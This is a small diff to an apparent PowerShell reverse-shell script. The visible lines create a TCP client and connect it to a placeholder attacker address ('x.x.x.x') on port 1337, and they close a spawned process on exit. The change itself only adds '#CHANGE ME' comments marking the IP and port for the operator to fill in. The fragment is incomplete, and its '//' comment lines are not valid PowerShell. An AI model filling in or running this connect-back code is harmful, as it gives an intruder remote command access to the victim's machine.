@@ -3,8 +3,10 @@ if ($client.Connected -eq $true) {$client.Close()}
 if ($process.ExitCode -ne $null) {$process.Close()}
 exit}
 // Setup IPADDR
+#CHANGE ME
 $address = 'x.x.x.x'
 // Setup PORT
+#CHANGE ME 
 $port = '1337'
 $client = New-Object system.net.sockets.tcpclient
 $client.connect($address,$port)
